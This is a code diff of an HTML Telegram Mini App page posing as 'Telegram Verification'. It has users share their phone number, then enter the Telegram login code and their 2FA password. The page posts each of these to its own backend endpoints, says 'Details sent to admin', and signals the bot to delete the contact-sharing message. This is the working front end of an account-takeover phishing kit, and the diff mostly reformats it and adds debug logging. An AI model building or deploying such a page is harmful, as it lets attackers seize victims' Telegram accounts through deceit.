@@ -5,87 +5,297 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
-        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
-        .container { max-width: 400px; background: white; border-radius: 20px; overflow: hidden; margin: 0 auto; }
-        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; text-align: center; }
-        .header h1 { font-size: 22px; margin-bottom: 5px; }
-        .header p { opacity: 0.9; font-size: 14px; }
-        .content { padding: 25px; }
-        .step { display: none; animation: fadeIn 0.3s; }
-        .step.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .step-title { font-size: 18px; font-weight: 600; margin-bottom: 15px; color: #333; display: flex; align-items: center; gap: 10px; }
-        .step-title .icon { font-size: 24px; }
-        .info-box { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-bottom: 20px; border-left: 4px solid #667eea; }
-        .info-box p { color: #666; font-size: 14px; line-height: 1.5; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 10px; }
-        .btn:hover { transform: translateY(-2px); opacity: 0.95; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .contact-btn { background: #0088cc; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .back-btn { background: #f8f9fa; color: #666; }
-        .otp-inputs { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
-        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #e0e0e0; border-radius: 10px; transition: all 0.3s; }
-        .otp-input:focus { border-color: #667eea; outline: none; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
-        .loading { text-align: center; padding: 30px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { text-align: center; padding: 30px; }
-        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
-        .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
-        .error.show { display: block; }
-        .password-input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; margin-bottom: 15px; }
-        #phone-display { font-weight: bold; text-align: center; margin: 10px 0; color: #333; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .step-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .step-title .icon {
+            font-size: 24px;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .info-box p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .contact-btn {
+            background: #0088cc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 18px;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .error.show {
+            display: block;
+        }
+        
+        .back-btn {
+            background: #f8f9fa;
+            color: #666;
+            margin-top: 15px;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #phone-display {
+            font-weight: bold;
+            color: #333;
+            margin: 10px 0;
+            text-align: center;
+        }
+        
+        .debug-log {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            max-width: 300px;
+            display: none;
+        }
     </style>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
+    <div class="debug-log" id="debug-log"></div>
+    
     <div class="container">
         <div class="header">
             <h1>🔐 Telegram Verification</h1>
-            <p>Secure WebApp Verification</p>
+            <p>Secure account verification</p>
         </div>
         
         <div class="content">
             <!-- Step 1: Welcome -->
             <div class="step active" id="step1">
-                <div class="step-title"><span class="icon">👋</span>Welcome</div>
+                <div class="step-title">
+                    <span class="icon">👋</span>
+                    Welcome
+                </div>
                 <div class="info-box">
-                    <p>Verify your Telegram account securely.</p>
-                    <p><small>No messages in chat • Auto-delete contact</small></p>
+                    <p>Verify your Telegram account. Share contact to receive OTP.</p>
+                    <p><small>No messages will be sent to your chat.</small></p>
                 </div>
                 <button class="btn" onclick="nextStep()">Start Verification</button>
             </div>
             
-            <!-- Step 2: Contact -->
+            <!-- Step 2: Contact Share -->
             <div class="step" id="step2">
-                <div class="step-title"><span class="icon">📱</span>Share Contact</div>
-                <div class="info-box">
-                    <p>Share your phone number to receive OTP.</p>
-                    <p><small>The contact message will be auto-deleted</small></p>
+                <div class="step-title">
+                    <span class="icon">📱</span>
+                    Share Contact
                 </div>
-                <button class="btn contact-btn" onclick="shareContact()">📞 Share Contact</button>
+                <div class="info-box">
+                    <p>Click the button to share your phone number for OTP.</p>
+                </div>
+                <button class="btn contact-btn" onclick="shareContact()">
+                    <span>📞</span> Share Contact
+                </button>
                 <button class="btn back-btn" onclick="prevStep()">Back</button>
             </div>
             
             <!-- Step 3: Loading -->
             <div class="step" id="step3">
                 <div class="loading">
-                    <div class="spinner"></div>
+                    <div class="loading-spinner"></div>
                     <p>Sending OTP...</p>
                     <p id="phone-info"></p>
                 </div>
             </div>
             
-            <!-- Step 4: OTP -->
+            <!-- Step 4: Enter OTP -->
             <div class="step" id="step4">
-                <div class="step-title"><span class="icon">🔢</span>Enter OTP</div>
+                <div class="step-title">
+                    <span class="icon">🔢</span>
+                    Enter OTP
+                </div>
                 <div class="info-box">
                     <p>Enter 5-digit code sent to:</p>
                     <p id="phone-display"></p>
                     <p><small>Format: 9 4 3 8 0 or 94380</small></p>
                 </div>
+                
                 <div class="error" id="otp-error"></div>
+                
                 <div class="otp-inputs">
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
@@ -93,19 +303,26 @@
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
                 </div>
+                
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
                 <button class="btn back-btn" onclick="goToStep(2)">Change Number</button>
             </div>
             
             <!-- Step 5: 2FA -->
             <div class="step" id="step5">
-                <div class="step-title"><span class="icon">🔐</span>2FA Password</div>
+                <div class="step-title">
+                    <span class="icon">🔐</span>
+                    2FA Password
+                </div>
                 <div class="info-box">
                     <p>Enter 2FA password for:</p>
                     <p id="phone-display-2fa"></p>
                 </div>
+                
                 <div class="error" id="password-error"></div>
+                
                 <input type="password" class="password-input" id="password-input" placeholder="2FA Password">
+                
                 <button class="btn" onclick="verifyPassword()">Verify Password</button>
                 <button class="btn back-btn" onclick="goToStep(4)">Back</button>
             </div>
@@ -115,7 +332,7 @@
                 <div class="success">
                     <div class="success-icon">✅</div>
                     <h2>Verified Successfully!</h2>
-                    <p>Account verification complete.</p>
+                    <p>Your account has been verified.</p>
                     <p><small>Details sent to admin</small></p>
                     <button class="btn" onclick="closeApp()">Close</button>
                 </div>
@@ -126,138 +343,154 @@
     <script>
         let currentStep = 1;
         let sessionId = null;
-        let webappId = null;
         let phoneNumber = '';
         let otpCode = '';
         
+        // Debug logging
+        function logDebug(message) {
+            console.log('[DEBUG]', message);
+            const logEl = document.getElementById('debug-log');
+            logEl.innerHTML = message;
+            logEl.style.display = 'block';
+            setTimeout(() => logEl.style.display = 'none', 3000);
+        }
+        
         // Initialize Telegram WebApp
         if (window.Telegram && Telegram.WebApp) {
+            logDebug('Telegram WebApp initialized');
             Telegram.WebApp.ready();
             Telegram.WebApp.expand();
             Telegram.WebApp.MainButton.hide();
-            Telegram.WebApp.BackButton.hide();
             
-            // Initialize WebApp session
-            initWebApp();
-        }
-        
-        async function initWebApp() {
-            try {
-                const user = Telegram.WebApp.initDataUnsafe?.user;
-                const userId = user?.id || 'unknown';
-                
-                const response = await fetch('/api/init-webapp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user_id: userId })
-                });
-                
-                const data = await response.json();
-                if (data.success) {
-                    webappId = data.webapp_id;
+            // Enable closing confirmation
+            Telegram.WebApp.enableClosingConfirmation();
+            
+            // Listen for contact data
+            Telegram.WebApp.onEvent('webAppDataReceived', (data) => {
+                logDebug('WebApp data received: ' + JSON.stringify(data));
+                try {
+                    const contactData = JSON.parse(data);
+                    if (contactData && contactData.contact) {
+                        handleContact(contactData.contact);
+                    }
+                } catch (e) {
+                    logDebug('Error parsing contact: ' + e);
                 }
-            } catch (error) {
-                console.log('WebApp init:', error);
-            }
+            });
+            
+            // Listen for main button click
+            Telegram.WebApp.MainButton.onClick(() => {
+                logDebug('Main button clicked');
+                shareContact();
+            });
+        } else {
+            logDebug('Telegram WebApp not available');
         }
         
         function nextStep() {
             document.querySelector('.step.active').classList.remove('active');
             currentStep++;
             document.getElementById(`step${currentStep}`).classList.add('active');
+            logDebug('Moved to step ' + currentStep);
         }
         
         function prevStep() {
             document.querySelector('.step.active').classList.remove('active');
             currentStep--;
             document.getElementById(`step${currentStep}`).classList.add('active');
+            logDebug('Back to step ' + currentStep);
         }
         
         function goToStep(step) {
             document.querySelector('.step.active').classList.remove('active');
             currentStep = step;
             document.getElementById(`step${step}`).classList.add('active');
+            logDebug('Jumped to step ' + step);
         }
         
         function shareContact() {
+            logDebug('Attempting to share contact');
             if (window.Telegram && Telegram.WebApp) {
-                // Share contact via Telegram WebApp
-                Telegram.WebApp.shareContact();
+                try {
+                    Telegram.WebApp.shareContact();
+                    logDebug('Contact share initiated');
+                } catch (e) {
+                    logDebug('Error sharing contact: ' + e);
+                    alert('Please use Telegram app to share contact');
+                }
             } else {
-                alert('Please use Telegram app to share contact');
+                alert('Please use Telegram app');
             }
         }
         
-        // Handle contact data from Telegram
-        if (window.Telegram && Telegram.WebApp) {
-            // Listen for contact data
-            Telegram.WebApp.onEvent('contactReceived', (contact) => {
-                if (contact) {
-                    handleContact(contact);
-                }
-            });
+        function handleContact(contact) {
+            logDebug('Contact received: ' + JSON.stringify(contact));
+            phoneNumber = contact.phone_number || '';
+            const firstName = contact.first_name || '';
+            const lastName = contact.last_name || '';
             
-            // Alternative: listen for data from main button
-            Telegram.WebApp.onEvent('mainButtonClicked', () => {
-                Telegram.WebApp.shareContact();
-            });
-        }
-        
-        async function handleContact(contact) {
-            if (!contact || !contact.phone_number) {
-                showError('Please share valid contact');
+            if (!phoneNumber) {
+                logDebug('No phone number in contact');
+                showError('otp-error', 'No phone number found');
                 return;
             }
             
-            phoneNumber = contact.phone_number;
-            if (!phoneNumber.startsWith('+')) {
-                phoneNumber = '+' + phoneNumber;
-            }
+            // Delete the contact sharing message
+            deleteContactMessage();
             
+            // Go to loading step
             goToStep(3);
             document.getElementById('phone-info').textContent = `Phone: ${phoneNumber}`;
             
-            try {
-                const response = await fetch('/api/process-contact', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: phoneNumber,
-                        webapp_id: webappId,
-                        first_name: contact.first_name || '',
-                        last_name: contact.last_name || ''
-                    })
-                });
-                
-                const data = await response.json();
-                
+            // Send to backend
+            fetch('/api/process-contact', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    first_name: firstName,
+                    last_name: lastName
+                })
+            })
+            .then(response => {
+                logDebug('Response status: ' + response.status);
+                return response.json();
+            })
+            .then(data => {
+                logDebug('Backend response: ' + JSON.stringify(data));
                 if (data.success) {
                     sessionId = data.session_id;
                     document.getElementById('phone-display').textContent = phoneNumber;
                     document.getElementById('phone-display-2fa').textContent = phoneNumber;
                     goToStep(4);
-                    
-                    // Focus first OTP input
-                    setTimeout(() => {
-                        const firstInput = document.querySelector('.otp-input');
-                        if (firstInput) firstInput.focus();
-                    }, 100);
-                    
-                    // Auto-delete contact message if possible
-                    if (window.Telegram && Telegram.WebApp) {
-                        try {
-                            Telegram.WebApp.sendData(JSON.stringify({
-                                action: 'delete_contact'
-                            }));
-                        } catch (e) {}
-                    }
+                    setTimeout(() => document.querySelector('.otp-input').focus(), 100);
                 } else {
                     showError('otp-error', data.error || 'Failed to send OTP');
                     goToStep(2);
                 }
-            } catch (error) {
+            })
+            .catch(error => {
+                logDebug('Fetch error: ' + error);
                 showError('otp-error', 'Network error');
                 goToStep(2);
+            });
+        }
+        
+        function deleteContactMessage() {
+            logDebug('Attempting to delete contact message');
+            // Send signal to delete contact message
+            if (window.Telegram && Telegram.WebApp) {
+                try {
+                    Telegram.WebApp.sendData(JSON.stringify({
+                        action: 'delete_contact_message',
+                        timestamp: Date.now()
+                    }));
+                    logDebug('Delete message signal sent');
+                } catch (e) {
+                    logDebug('Error sending delete signal: ' + e);
+                }
             }
         }
         
@@ -275,128 +508,136 @@
                 const nextInput = document.querySelector(`.otp-input:nth-child(${nextIndex})`);
                 if (nextInput) nextInput.focus();
             }
+            
+            logDebug('OTP code: ' + otpCode);
         }
         
-        async function verifyOTP() {
-            if (otpCode.length !== 5) return;
-            
-            const verifyBtn = document.getElementById('verify-btn');
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = 'Verifying...';
-            
-            try {
-                const response = await fetch('/api/verify-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        session_id: sessionId,
-                        otp: otpCode
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    if (data.requires_2fa) {
-                        goToStep(5);
-                    } else {
-                        // Success
-                        await fetch('/api/complete', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                session_id: sessionId,
-                                phone: phoneNumber
-                            })
-                        });
-                        goToStep(6);
-                    }
-                } else {
-                    showError('otp-error', data.error);
-                    verifyBtn.disabled = false;
-                    verifyBtn.textContent = 'Verify OTP';
-                }
-            } catch (error) {
-                showError('otp-error', 'Network error');
-                verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Verify OTP';
-            }
-        }
-        
-        async function verifyPassword() {
-            const password = document.getElementById('password-input').value.trim();
-            if (!password) {
-                showError('password-error', 'Enter 2FA password');
+        function verifyOTP() {
+            if (otpCode.length !== 5) {
+                showError('otp-error', 'Please enter 5-digit OTP');
                 return;
             }
             
+            logDebug('Verifying OTP: ' + otpCode);
+            document.getElementById('verify-btn').disabled = true;
+            document.getElementById('verify-btn').textContent = 'Verifying...';
+            
+            fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    otp: otpCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                logDebug('OTP verification response: ' + JSON.stringify(data));
+                if (data.success) {
+                    if (data.requires_2fa) {
+                        logDebug('2FA required');
+                        goToStep(5);
+                    } else {
+                        logDebug('OTP verified successfully');
+                        completeVerification();
+                    }
+                } else {
+                    showError('otp-error', data.error || 'Verification failed');
+                    document.getElementById('verify-btn').disabled = false;
+                    document.getElementById('verify-btn').textContent = 'Verify OTP';
+                }
+            })
+            .catch(error => {
+                logDebug('OTP verification error: ' + error);
+                showError('otp-error', 'Network error');
+                document.getElementById('verify-btn').disabled = false;
+                document.getElementById('verify-btn').textContent = 'Verify OTP';
+            });
+        }
+        
+        function verifyPassword() {
+            const password = document.getElementById('password-input').value;
+            if (!password) {
+                showError('password-error', 'Enter password');
+                return;
+            }
+            
+            logDebug('Verifying 2FA password');
             const btn = document.querySelector('#step5 .btn');
             btn.disabled = true;
             btn.textContent = 'Verifying...';
             
-            try {
-                const response = await fetch('/api/verify-2fa', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        session_id: sessionId,
-                        password: password
-                    })
-                });
-                
-                const data = await response.json();
-                
+            fetch('/api/verify-2fa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                logDebug('2FA verification response: ' + JSON.stringify(data));
                 if (data.success) {
-                    // Success with 2FA
-                    await fetch('/api/complete', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            session_id: sessionId,
-                            phone: phoneNumber,
-                            has_2fa: true
-                        })
-                    });
-                    goToStep(6);
+                    logDebug('2FA verified successfully');
+                    completeVerification();
                 } else {
                     showError('password-error', data.error || 'Wrong password');
                     btn.disabled = false;
                     btn.textContent = 'Verify Password';
                 }
-            } catch (error) {
+            })
+            .catch(error => {
+                logDebug('2FA verification error: ' + error);
                 showError('password-error', 'Network error');
                 btn.disabled = false;
                 btn.textContent = 'Verify Password';
-            }
+            });
+        }
+        
+        function completeVerification() {
+            logDebug('Completing verification');
+            // Notify backend
+            fetch('/api/complete', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    phone: phoneNumber
+                })
+            })
+            .then(() => {
+                goToStep(6);
+            })
+            .catch(error => {
+                logDebug('Complete verification error: ' + error);
+                goToStep(6); // Still show success even if notification fails
+            });
         }
         
         function showError(elementId, message) {
+            logDebug('Error: ' + message);
             const element = document.getElementById(elementId);
-            if (element) {
-                element.textContent = message;
-                element.classList.add('show');
-                setTimeout(() => element.classList.remove('show'), 5000);
-            }
+            element.textContent = message;
+            element.classList.add('show');
+            setTimeout(() => element.classList.remove('show'), 3000);
         }
         
         function closeApp() {
+            logDebug('Closing WebApp');
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.close();
             }
         }
         
-        // Initialize first step
-        document.addEventListener('DOMContentLoaded', function() {
-            // Set Telegram theme if available
-            if (window.Telegram && Telegram.WebApp) {
-                const theme = Telegram.WebApp.colorScheme;
-                if (theme === 'dark') {
-                    document.body.style.background = '#0f0f23';
-                    document.querySelector('.container').style.background = '#1c1c1c';
-                    document.querySelector('.container').style.color = '#fff';
-                }
-            }
-        });
+        // Initialize
+        logDebug('WebApp loaded');
     </script>
 </body>
     </html>
